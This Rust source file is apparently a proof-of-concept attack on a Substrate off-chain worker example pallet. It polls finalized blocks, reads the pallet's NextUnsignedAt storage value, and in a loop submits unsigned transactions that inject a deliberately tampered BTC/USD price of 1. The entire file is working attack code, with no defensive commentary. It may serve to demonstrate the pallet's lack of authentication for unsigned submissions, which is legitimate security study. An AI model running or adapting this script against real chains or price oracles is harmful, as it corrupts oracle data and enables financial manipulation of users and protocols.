use crate::{substrate, Api};

pub async fn send_unsigned_tampered_price(api: Api) -> Result<(), Box<dyn std::error::Error>> {
	let price = 1;

	let mut last_unsigned_at = -1;
	loop {
		let last_finalized_block_hash = api.rpc().finalized_head().await?;
		let last_finalized_block = api.rpc().block(Some(last_finalized_block_hash)).await?.unwrap();
		let last_finalized_block_n = last_finalized_block.block.header.number;

		// storage address for NextUnsignedAt<T> on OCW example pallet
		let next_unsigned_at_addr = substrate::storage().ocw_example().next_unsigned_at();

		// current value of NextUnsignedAt<T>
		let next_unsigned_at = api
			.storage()
			.at(Some(last_finalized_block_hash))
			.await?
			.fetch(&next_unsigned_at_addr)
			.await?
			.unwrap_or_default();

		// time to submit unsigned?
		if next_unsigned_at as i32 > last_unsigned_at {
			log::info!(
				"next_unsigned_at {}, last_finalized_block_n {}",
				next_unsigned_at,
				last_finalized_block_n
			);

			let call = substrate::tx().ocw_example().submit_price_unsigned(next_unsigned_at, price);
			let tx = api.tx().create_unsigned(&call).unwrap();

			let tx_hash = tx.submit().await?;
			log::info!(
				"submitted an unsigned tx with tampered BTC/USD price of {}: {}",
				price,
				tx_hash
			);

			last_unsigned_at = next_unsigned_at as i32;
		}
	}
}
